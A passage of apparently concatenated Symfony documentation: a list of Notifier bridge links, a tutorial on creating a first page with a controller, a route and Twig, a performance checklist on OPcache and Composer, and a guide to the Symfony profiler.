.. _`Iqsms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Iqsms/README.md
.. _`iSendPro`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Isendpro/README.md
.. _`KazInfoTeh`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/KazInfoTeh/README.md
.. _`LINE Notify`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/LineNotify/README.md
.. _`LightSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/LightSms/README.md
.. _`LinkedIn`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/LinkedIn/README.md
.. _`LOX24`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Lox24/README.md
.. _`Mailjet`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mailjet/README.md
.. _`Mastodon`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mastodon/README.md
.. _`Mattermost`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mattermost/README.md
.. _`Mercure`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mercure/README.md
.. _`MessageBird`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/MessageBird/README.md
.. _`MessageMedia`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/MessageMedia/README.md
.. _`MicrosoftTeams`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/MicrosoftTeams/README.md
.. _`Mobyt`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mobyt/README.md
.. _`Nexmo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Nexmo/README.md
.. _`Novu`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Novu/README.md
.. _`Ntfy`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Ntfy/README.md
.. _`Octopush`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Octopush/README.md
.. _`OneSignal`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/OneSignal/README.md
.. _`OrangeSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/OrangeSms/README.md
.. _`OvhCloud`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/OvhCloud/README.md
.. _`PagerDuty`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/PagerDuty/README.md
.. _`Plivo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Plivo/README.md
.. _`Pushover`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Pushover/README.md
.. _`Pushy`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Pushy/README.md
.. _`Redlink`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Redlink/README.md
.. _`RFC 3986`: https://www.ietf.org/rfc/rfc3986.txt
.. _`RingCentral`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/RingCentral/README.md
.. _`RocketChat`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/RocketChat/README.md
.. _`SMSFactor`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SmsFactor/README.md
.. _`Sendberry`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sendberry/README.md
.. _`Seven.io`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sevenio/README.md
.. _`SimpleTextin`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SimpleTextin/README.md
.. _`Sinch`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sinch/README.md
.. _`Slack`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Slack/README.md
.. _`Sms77`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sms77/README.md
.. _`SmsBiuras`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SmsBiuras/README.md
.. _`Smsbox`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Smsbox/README.md
.. _`Smsapi`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Smsapi/README.md
.. _`Smsc`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Smsc/README.md
.. _`SMSense`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SMSense/README.md
.. _`SmsSluzba`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SmsSluzba/README.md
.. _`SpotHit`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SpotHit/README.md
.. _`Telegram`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Telegram/README.md
.. _`Telnyx`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Telnyx/README.md
.. _`TurboSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/TurboSms/README.md
.. _`Twilio`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Twilio/README.md
.. _`Twitter`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Twitter/README.md
.. _`Unifonic`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Unifonic/README.md
.. _`Vonage`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Vonage/README.md
.. _`Yunpian`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Yunpian/README.md
.. _`Zendesk`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Zendesk/README.md
.. _`Zulip`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Zulip/README.md
.. _creating-pages-in-symfony2:
.. _creating-pages-in-symfony:

Create your First Page in Symfony
=================================

Creating a new page - whether it's an HTML page or a JSON endpoint - is a
two-step process:

#. **Create a controller**: A controller is the PHP function you write that
   builds the page. You take the incoming request information and use it to
   create a Symfony ``Response`` object, which can hold HTML content, a JSON
   string or even a binary file like an image or PDF;

#. **Create a route**: A route is the URL (e.g. ``/about``) to your page and
   points to a controller.

.. admonition:: Screencast
    :class: screencast

    Do you prefer video tutorials? Check out the `Harmonious Development with Symfony`_
    screencast series.

.. seealso::

    Symfony *embraces* the HTTP Request-Response lifecycle. To find out more,
    see :doc:`/introduction/http_fundamentals`.

Creating a Page: Route and Controller
-------------------------------------

.. tip::

    Before continuing, make sure you've read the :doc:`Setup </setup>`
    article and can access your new Symfony app in the browser.

Suppose you want to create a page - ``/lucky/number`` - that generates a lucky (well,
random) number and prints it. To do that, create a "Controller" class and a
"controller" method inside of it::

    <?php
    // src/Controller/LuckyController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;

    class LuckyController
    {
        public function number(): Response
        {
            $number = random_int(0, 100);

            return new Response(
                '<html><body>Lucky number: '.$number.'</body></html>'
            );
        }
    }

.. _annotation-routes:
.. _attribute-routes:

Now you need to associate this controller function with a public URL (e.g. ``/lucky/number``)
so that the ``number()`` method is called when a user browses to it. This association
is defined with the ``#[Route]`` attribute (in PHP, `attributes`_ are used to add
metadata to code):

.. code-block:: diff

      // src/Controller/LuckyController.php

      // ...
    + use Symfony\Component\Routing\Attribute\Route;

      class LuckyController
      {
    +     #[Route('/lucky/number')]
          public function number(): Response
          {
              // this looks exactly the same
          }
      }

That's it! If you are using :doc:`the Symfony web server </setup/symfony_server>`,
try it out by going to: http://localhost:8000/lucky/number

.. tip::

    Symfony recommends defining routes as attributes to have the controller code
    and its route configuration at the same location. However, if you prefer, you can
    :doc:`define routes in separate files </routing>` using YAML, XML and PHP formats.

If you see a lucky number being printed back to you, congratulations! But before
you run off to play the lottery, check out how this works. Remember the two steps
to create a page?

#. *Create a controller and a method*: This is a function where *you* build the page and ultimately
   return a ``Response`` object. You'll learn more about :doc:`controllers </controller>`
   in their own section, including how to return JSON responses;

#. *Create a route*: In ``config/routes.yaml``, the route defines the URL to your
   page (``path``) and what ``controller`` to call. You'll learn more about :doc:`routing </routing>`
   in its own section, including how to make *variable* URLs.

The bin/console Command
-----------------------

Your project already has a powerful debugging tool inside: the ``bin/console`` command.
Try running it:

.. code-block:: terminal

    $ php bin/console

You should see a list of commands that can give you debugging information, help generate
code, generate database migrations and a lot more. As you install more packages,
you'll see more commands.

To get a list of *all* of the routes in your system, use the ``debug:router`` command:

.. code-block:: terminal

    $ php bin/console debug:router

You should see your ``app_lucky_number`` route in the list:

.. code-block:: terminal

    ----------------  -------  -------  -----  --------------
    Name              Method   Scheme   Host   Path
    ----------------  -------  -------  -----  --------------
    app_lucky_number  ANY      ANY      ANY    /lucky/number
    ----------------  -------  -------  -----  --------------

You will also see debugging routes besides ``app_lucky_number`` -- more on
the debugging routes in the next section.

You'll learn about many more commands as you continue!

.. tip::

    If your shell is supported, you can also set up console completion support.
    This autocompletes commands and other input when using ``bin/console``.
    See :ref:`the Console document <console-completion-setup>` for more
    information on how to set up completion.

.. _web-debug-toolbar:

The Web Debug Toolbar: Debugging Dream
--------------------------------------

One of Symfony's *amazing* features is the Web Debug Toolbar: a bar that displays
a *huge* amount of debugging information along the bottom of your page while
developing. This is all included out of the box using a :ref:`Symfony pack <symfony-packs>`
called ``symfony/profiler-pack``.

You will see a dark bar along the bottom of the page. You'll learn more about
all the information it holds along the way, but feel free to experiment: hover
over and click the different icons to get information about routing,
performance, logging and more.

Rendering a Template
--------------------

If you're returning HTML from your controller, you'll probably want to render
a template. Fortunately, Symfony comes with `Twig`_: a templating language that's
minimal, powerful and actually quite fun.

Install the twig package with:

.. code-block:: terminal

    $ composer require twig

Make sure that ``LuckyController`` extends Symfony's base
:class:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController` class:

.. code-block:: diff

      // src/Controller/LuckyController.php

      // ...
    + use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

    - class LuckyController
    + class LuckyController extends AbstractController
      {
          // ...
      }

Now, use the handy ``render()`` method to render a template. Pass it a ``number``
variable so you can use it in Twig::

    // src/Controller/LuckyController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    // ...

    class LuckyController extends AbstractController
    {
        #[Route('/lucky/number')]
        public function number(): Response
        {
            $number = random_int(0, 100);

            return $this->render('lucky/number.html.twig', [
                'number' => $number,
            ]);
        }
    }

Template files live in the ``templates/`` directory, which was created for you automatically
when you installed Twig. Create a new ``templates/lucky`` directory with a new
``number.html.twig`` file inside:

.. code-block:: html+twig

    {# templates/lucky/number.html.twig #}
    <h1>Your lucky number is {{ number }}</h1>

The ``{{ number }}`` syntax is used to *print* variables in Twig. Refresh your browser
to get your *new* lucky number!

    http://localhost:8000/lucky/number

Now you may wonder where the Web Debug Toolbar has gone: that's because there is
no ``</body>`` tag in the current template. You can add the body element yourself,
or extend ``base.html.twig``, which contains all default HTML elements.

In the :doc:`templates </templates>` article, you'll learn all about Twig: how
to loop, render other templates and leverage its powerful layout inheritance system.

Checking out the Project Structure
----------------------------------

Great news! You've already worked inside the most important directories in your
project:

``config/``
    Contains... configuration!. You will configure routes,
    :doc:`services </service_container>` and packages.

``src/``
    All your PHP code lives here.

``templates/``
    All your Twig templates live here.

Most of the time, you'll be working in ``src/``, ``templates/`` or ``config/``.
As you keep reading, you'll learn what can be done inside each of these.

So what about the other directories in the project?

``bin/``
    The famous ``bin/console`` file lives here (and other, less important
    executable files).

``var/``
    This is where automatically-created files are stored, like cache files
    (``var/cache/``) and logs (``var/log/``).

``vendor/``
    Third-party (i.e. "vendor") libraries live here! These are downloaded via the `Composer`_
    package manager.

``public/``
    This is the document root for your project: you put any publicly accessible files
    here.

And when you install new packages, new directories will be created automatically
when needed.

What's Next?
------------

Congrats! You're already starting to master Symfony and learn a whole new
way of building beautiful, functional, fast and maintainable applications.

OK, time to finish mastering the fundamentals by reading these articles:

* :doc:`/routing`
* :doc:`/controller`
* :doc:`/templates`
* :doc:`/frontend`
* :doc:`/configuration`

Then, learn about other important topics like the
:doc:`service container </service_container>`,
the :doc:`form system </forms>`, using :doc:`Doctrine </doctrine>`
(if you need to query a database) and more!

Have fun!

Go Deeper with HTTP & Framework Fundamentals
--------------------------------------------

.. toctree::
    :maxdepth: 1
    :glob:

    introduction/*

.. _`Twig`: https://twig.symfony.com
.. _`Composer`: https://getcomposer.org
.. _`Harmonious Development with Symfony`: https://symfonycasts.com/screencast/symfony/setup
.. _`attributes`: https://www.php.net/manual/en/language.attributes.overview.php
Performance
===========

Symfony is fast, right out of the box. However, you can make it faster if you
optimize your servers and your applications as explained in the following
performance checklists.

Performance Checklists
----------------------

Use these checklists to verify that your application and server are configured
for maximum performance:

* **Symfony Application Checklist**:

  #. :ref:`Install APCu Polyfill if your server uses APC <performance-install-apcu-polyfill>`
  #. :ref:`Restrict the number of locales enabled in the application <performance-enabled-locales>`

* **Production Server Checklist**:

  #. :ref:`Dump the service container into a single file <performance-service-container-single-file>`
  #. :ref:`Use the OPcache byte code cache <performance-use-opcache>`
  #. :ref:`Configure OPcache for maximum performance <performance-configure-opcache>`
  #. :ref:`Don't check PHP files timestamps <performance-dont-check-timestamps>`
  #. :ref:`Configure the PHP realpath Cache <performance-configure-realpath-cache>`
  #. :ref:`Optimize Composer Autoloader <performance-optimize-composer-autoloader>`

.. _performance-install-apcu-polyfill:

Install APCu Polyfill if your Server Uses APC
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your production server still uses the legacy APC PHP extension instead of
OPcache, install the `APCu Polyfill component`_ in your application to enable
compatibility with `APCu PHP functions`_ and unlock support for advanced Symfony
features, such as the APCu Cache adapter.

.. _performance-enabled-locales:

Restrict the Number of Locales Enabled in the Application
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Use the :ref:`framework.enabled_locales <reference-enabled-locales>`
option to only generate the translation files actually used in your application.

.. _performance-service-container-single-file:

Dump the Service Container into a Single File
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony compiles the :doc:`service container </service_container>` into multiple
small files by default. Set this parameter to ``true`` to compile the entire
container into a single file, which could improve performance when using
"class preloading" in PHP 7.4 or newer versions:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        parameters:
            # ...
            .container.dumper.inline_factories: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <parameters>
                <!-- ... -->
                <parameter key=".container.dumper.inline_factories">true</parameter>
            </parameters>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $container->parameters()->set('.container.dumper.inline_factories', true);
        };

.. _performance-use-opcache:

.. tip::

    The ``.`` prefix denotes a parameter that is only used during compilation of the container.
    See :ref:`Configuration Parameters <configuration-parameters>` for more details.

Use the OPcache Byte Code Cache
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

OPcache stores the compiled PHP files to avoid having to recompile them for
every request. There are some `byte code caches`_ available, but as of PHP
5.5, PHP comes with `OPcache`_ built-in. For older versions, the most widely
used byte code cache is `APC`_.

.. _performance-use-preloading:

Use the OPcache class preloading
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Starting from PHP 7.4, OPcache can compile and load classes at start-up and
make them available to all requests until the server is restarted, improving
performance significantly.

During container compilation (e.g. when running the ``cache:clear`` command),
Symfony generates a file with the list of classes to preload in the
``var/cache/`` directory. Rather than use this file directly, use the
``config/preload.php`` file that is created when
:doc:`using Symfony Flex in your project </setup/flex>`:

.. code-block:: ini

    ; php.ini
    opcache.preload=/path/to/project/config/preload.php

    ; required for opcache.preload:
    opcache.preload_user=www-data

If this file is missing, run this command to update the Symfony Flex recipe:
``composer recipes:update symfony/framework-bundle``.

Use the :ref:`container.preload <dic-tags-container-preload>` and
:ref:`container.no_preload <dic-tags-container-nopreload>` service tags to define
which classes should or should not be preloaded by PHP.

.. _performance-configure-opcache:

Configure OPcache for Maximum Performance
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The default OPcache configuration is not suited for Symfony applications, so
it's recommended to change these settings as follows:

.. code-block:: ini

    ; php.ini
    ; maximum memory that OPcache can use to store compiled PHP files
    opcache.memory_consumption=256

    ; maximum number of files that can be stored in the cache
    opcache.max_accelerated_files=20000

.. _performance-dont-check-timestamps:

Don't Check PHP Files Timestamps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In production servers, PHP files should never change, unless a new application
version is deployed. However, by default OPcache checks if cached files have
changed their contents since they were cached. This check introduces some
overhead that can be avoided as follows:

.. code-block:: ini

    ; php.ini
    opcache.validate_timestamps=0

After each deployment, you must empty and regenerate the cache of OPcache. Otherwise
you won't see the updates made in the application. Given that in PHP, the CLI
and the web processes don't share the same OPcache, you cannot clear the web
server OPcache by executing some command in your terminal. These are some of the
possible solutions:

1. Restart the web server;
2. Call the ``apc_clear_cache()`` or ``opcache_reset()`` functions via the
   web server (i.e. by having these in a script that you execute over the web);
3. Use the `cachetool`_ utility to control APC and OPcache from the CLI.

.. _performance-configure-realpath-cache:

Configure the PHP ``realpath`` Cache
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When a relative path is transformed into its real and absolute path, PHP
caches the result to improve performance. Applications that open many PHP files,
such as Symfony projects, should use at least these values:

.. code-block:: ini

    ; php.ini
    ; maximum memory allocated to store the results
    realpath_cache_size=4096K

    ; save the results for 10 minutes (600 seconds)
    realpath_cache_ttl=600

.. note::

    PHP disables the ``realpath`` cache when the `open_basedir`_ config option
    is enabled.

.. _performance-optimize-composer-autoloader:

Optimize Composer Autoloader
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The class loader used while developing the application is optimized to find new
and changed classes. In production servers, PHP files should never change,
unless a new application version is deployed. That's why you can optimize
Composer's autoloader to scan the entire application once and build an
optimized "class map", which is a big array of the locations of all the classes
and it's stored in ``vendor/composer/autoload_classmap.php``.

Execute this command to generate the new class map (and make it part of your
deployment process too):

.. code-block:: terminal

    $ composer dump-autoload --no-dev --classmap-authoritative

* ``--no-dev`` excludes the classes that are only needed in the development
  environment (i.e. ``require-dev`` dependencies and ``autoload-dev`` rules);
* ``--classmap-authoritative`` creates a class map for PSR-0 and PSR-4 compatible classes
  used in your application and prevents Composer from scanning the file system for
  classes that are not found in the class map. (see: `Composer's autoloader optimization`_).

Disable Dumping the Container as XML in Debug Mode
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In :ref:`debug mode <debug-mode>`, Symfony generates an XML file with all the
:doc:`service container </service_container>` information (services, arguments, etc.)
This XML file is used by various debugging commands such as ``debug:container``
and ``debug:autowiring``.

When the container grows larger and larger, so does the size of the file and the
time to generate it. If the benefit of this XML file does not outweigh the decrease
in performance, you can stop generating the file as follows:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        parameters:
            # ...
            debug.container.dump: false

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <parameters>
                <!-- ... -->
                <parameter key="debug.container.dump">false</parameter>
            </parameters>
        </container>

    .. code-block:: php

        // config/services.php

        // ...
        $container->parameters()->set('debug.container.dump', false);

.. _profiling-applications:

Profiling Symfony Applications
------------------------------

Profiling with Blackfire
~~~~~~~~~~~~~~~~~~~~~~~~

`Blackfire`_ is the best tool to profile and optimize performance of Symfony
applications during development, test and production. It's a commercial service,
but provides a `full-featured demo`_.

Profiling with Symfony Stopwatch
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony provides a basic performance profiler in the development
:ref:`config environment <configuration-environments>`. Click on the "time panel"
of the :ref:`web debug toolbar <web-debug-toolbar>` to see how much time Symfony
spent on tasks such as making database queries and rendering templates.

You can measure the execution time and memory consumption of your own code and
display the result in the Symfony profiler thanks to the `Stopwatch component`_.

When using :ref:`autowiring <services-autowire>`, type-hint any controller or
service argument with the :class:`Symfony\\Component\\Stopwatch\\Stopwatch` class
and Symfony will inject the ``debug.stopwatch`` service::

    use Symfony\Component\Stopwatch\Stopwatch;

    class DataExporter
    {
        public function __construct(
            private Stopwatch $stopwatch,
        ) {
        }

        public function export(): void
        {
            // the argument is the name of the "profiling event"
            $this->stopwatch->start('export-data');

            // ...do things to export data...

            // reset the stopwatch to delete all the data measured so far
            // $this->stopwatch->reset();

            $this->stopwatch->stop('export-data');
        }
    }

If the request calls this service during its execution, you'll see a new
event called ``export-data`` in the Symfony profiler.

The ``start()``, ``stop()`` and ``getEvent()`` methods return a
:class:`Symfony\\Component\\Stopwatch\\StopwatchEvent` object that provides
information about the current event, even while it's still running. This
object can be converted to a string for a quick summary::

    // ...
    dump((string) $this->stopwatch->getEvent('export-data')); // dumps e.g. '4.50 MiB - 26 ms'

You can also profile your template code with the :ref:`stopwatch Twig tag <reference-twig-tag-stopwatch>`:

.. code-block:: twig

    {% stopwatch 'render-blog-posts' %}
        {% for post in blog_posts %}
            {# ... #}
        {% endfor %}
    {% endstopwatch %}

Profiling Categories
....................

Use the second optional argument of the ``start()`` method to define the
category or tag of the event. This helps keep events organized by type::

    $this->stopwatch->start('export-data', 'export');

Profiling Periods
.................

A `real-world stopwatch`_ not only includes the start/stop button but also a
"lap button" to measure each partial lap. This is exactly what the ``lap()``
method does, which stops an event and then restarts it immediately::

    $this->stopwatch->start('process-data-records', 'export');

    foreach ($records as $record) {
        // ... some code goes here
        $this->stopwatch->lap('process-data-records');
    }

    $event = $this->stopwatch->stop('process-data-records');
    // $event->getDuration(), $event->getMemory(), etc.

    // Lap information is stored as "periods" within the event:
    // $event->getPeriods();

Profiling Sections
..................

Sections are a way to split the profile timeline into groups. Example::

    $this->stopwatch->openSection();
    $this->stopwatch->start('validating-file', 'validation');
    $this->stopwatch->stopSection('parsing');

    $events = $this->stopwatch->getSectionEvents('parsing');

    // later you can reopen a section passing its name to the openSection() method
    $this->stopwatch->openSection('parsing');
    $this->stopwatch->start('processing-file');
    $this->stopwatch->stopSection('parsing');

All events that don't belong to any named section are added to the special section
called ``__root__``. This way you can get all stopwatch events, even if you don't
know their names, as follows::

    foreach($this->stopwatch->getSectionEvents('__root__') as $event) {
        echo (string) $event;
    }

Learn more
----------

* :doc:`/http_cache/varnish`

.. _`byte code caches`: https://en.wikipedia.org/wiki/List_of_PHP_accelerators
.. _`OPcache`: https://www.php.net/manual/en/book.opcache.php
.. _`Composer's autoloader optimization`: https://getcomposer.org/doc/articles/autoloader-optimization.md
.. _`APC`: https://www.php.net/manual/en/book.apc.php
.. _`APCu Polyfill component`: https://github.com/symfony/polyfill-apcu
.. _`APCu PHP functions`: https://www.php.net/manual/en/ref.apcu.php
.. _`cachetool`: https://github.com/gordalina/cachetool
.. _`open_basedir`: https://www.php.net/manual/ini.core.php#ini.open-basedir
.. _`Blackfire`: https://blackfire.io/docs/introduction?utm_source=symfony&utm_medium=symfonycom_docs&utm_campaign=performance
.. _`full-featured demo`: https://demo.blackfire.io?utm_source=symfony&utm_medium=symfonycom_docs&utm_campaign=performance
.. _`Stopwatch component`: https://symfony.com/components/Stopwatch
.. _`real-world stopwatch`: https://en.wikipedia.org/wiki/Stopwatch
Profiler
========

The profiler is a powerful **development tool** that gives detailed information
about the execution of any request.

.. danger::

    **Never** enable the profiler in production environments
    as it will lead to major security vulnerabilities in your project.

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the ``profiler`` :ref:`Symfony pack <symfony-packs>` before using it:

.. code-block:: terminal

    $ composer require --dev symfony/profiler-pack

Now, browse any page of your application in the development environment to let
the profiler collect information. Then, click on any element of the debug
toolbar injected at the bottom of your pages to open the web interface of the
Symfony Profiler, which will look like this:

.. image:: /_images/profiler/web-interface.png
    :alt: The Symfony Web profiler page.
    :class: with-browser

.. note::

    The debug toolbar is only injected into HTML responses. For other kinds of
    contents (e.g. JSON responses in API requests) the profiler URL is available
    in the ``X-Debug-Token-Link`` HTTP response header. Browse the ``/_profiler``
    URL to see all profiles.

.. note::

    To limit the storage used by profiles on disk, they are probabilistically
    removed after 2 days.

Accessing Profiling Data Programmatically
-----------------------------------------

Most of the time, the profiler information is accessed and analyzed using its
web-based interface. However, you can also retrieve profiling information
programmatically thanks to the methods provided by the ``profiler`` service.

When the response object is available, use the
:method:`Symfony\\Component\\HttpKernel\\Profiler\\Profiler::loadProfileFromResponse`
method to access to its associated profile::

    // ... $profiler is the 'profiler' service
    $profile = $profiler->loadProfileFromResponse($response);

When the profiler stores data about a request, it also associates a token with it;
this token is available in the ``X-Debug-Token`` HTTP header of the response.
Using this token, you can access the profile of any past response thanks to the
:method:`Symfony\\Component\\HttpKernel\\Profiler\\Profiler::loadProfile` method::

    $token = $response->headers->get('X-Debug-Token');
    $profile = $profiler->loadProfile($token);

.. tip::

    When the profiler is enabled but not the web debug toolbar, inspect the page
    with your browser's developer tools to get the value of the ``X-Debug-Token``
    HTTP header.

The ``profiler`` service also provides the
:method:`Symfony\\Component\\HttpKernel\\Profiler\\Profiler::find` method to
look for tokens based on some criteria::

    // gets the latest 10 tokens
    $tokens = $profiler->find('', '', 10, '', '', '');

    // gets the latest 10 tokens for all URLs containing /admin/
    $tokens = $profiler->find('', '/admin/', 10, '', '', '');

    // gets the latest 10 tokens for all URLs not containing /api/
    $tokens = $profiler->find('', '!/api/', 10, '', '', '');

    // gets the latest 10 tokens for local POST requests
    $tokens = $profiler->find('127.0.0.1', '', 10, 'POST', '', '');

    // gets the latest 10 tokens for requests that happened between 2 and 4 days ago
    $tokens = $profiler->find('', '', 10, '', '4 days ago', '2 days ago');

Data Collectors
---------------

The profiler gets its information using some services called "data collectors".
Symfony comes with several collectors that get information about the request,
the logger, the routing, the cache, etc.

Run this command to get the list of collectors actually enabled in your app:

.. code-block:: terminal

    $ php bin/console debug:container --tag=data_collector

You can also :ref:`create your own data collector <profiler-data-collector>` to
store any data generated by your app and display it in the debug toolbar and the
profiler web interface.

.. _profiler-timing-execution:

Timing the Execution of the Application
---------------------------------------

If you want to measure the time some tasks take in your application, there's no
need to create a custom data collector. Instead, use the built-in utilities to
:ref:`profile Symfony applications <profiling-applications>`.

.. tip::

    Consider using a professional profiler such as `Blackfire`_ to measure and
    analyze the execution of your application in detail.

.. _enabling-the-profiler-programmatically:

Enabling the Profiler Programmatically or Conditionally
-------------------------------------------------------

Symfony Profiler can be enabled and disabled programmatically. You can use the ``enable()``
and ``disable()`` methods of the :class:`Symfony\\Component\\HttpKernel\\Profiler\\Profiler`
class in your controllers to manage the profiler programmatically::

    use Symfony\Component\HttpKernel\Profiler\Profiler;
    // ...

    class DefaultController
    {
        // ...

        public function someMethod(?Profiler $profiler): Response
        {
            // $profiler won't be set if your environment doesn't have the profiler (like prod, by default)
            if (null !== $profiler) {
                // if it exists, disable the profiler for this particular controller action
                $profiler->disable();
            }

            // ...
        }
    }

In order for the profiler to be injected into your controller you need to
create an alias pointing to the existing ``profiler`` service:

.. configuration-block::

    .. code-block:: yaml

        # config/services_dev.yaml
        services:
            Symfony\Component\HttpKernel\Profiler\Profiler: '@profiler'

    .. code-block:: xml

        <!-- config/services_dev.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Symfony\Component\HttpKernel\Profiler\Profiler" alias="profiler"/>
            </services>
        </container>

    .. code-block:: php

        // config/services_dev.php
        use Symfony\Component\HttpKernel\Profiler\Profiler;

        $container->setAlias(Profiler::class, 'profiler');

.. _enabling-the-profiler-conditionally:

Enabling the Profiler Conditionally
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of enabling the profiler programmatically as explained in the previous
section, you can also enable it when a certain condition is met (e.g. a certain
parameter is included in the URL):

.. code-block:: yaml

    # config/packages/dev/web_profiler.yaml
        framework:
            profiler:
                collect: false
                collect_parameter: 'profile'

This configuration disables the profiler by default (``collect: false``) to
improve the application performance; but enables it for requests that include a
query parameter called ``profile`` (you can freely choose this query parameter name).

In addition to the query parameter, this feature also works when submitting a
form field with that name (useful to enable the profiler in ``POST`` requests)
or when including it as a request attribute.

